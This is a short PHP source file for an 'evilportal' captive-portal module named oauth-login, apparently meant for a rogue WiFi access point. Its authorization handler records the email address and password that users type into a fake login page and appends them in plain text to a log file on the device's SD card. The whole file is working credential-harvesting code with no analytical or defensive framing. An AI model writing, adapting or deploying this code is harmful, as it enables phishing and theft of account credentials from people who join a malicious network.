<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {

      if (!is_dir('/sd/evilportal-data/oauth-login/')) {
        mkdir('/sd/evilportal-data/oauth-login/');
      }

      if (isset($_POST['email'])) {
        file_put_contents("/sd/evilportal-data/oauth-login/logs.txt", $_POST['email'] . ' : ' . $_POST['pass'] . "\n", FILE_APPEND);
      }

        // Call parent to handle basic authorization first
        parent::handleAuthorization();

        // Check for other form data here
    }

    public function showSuccess()
    {
        // Calls default success message
        parent::showSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
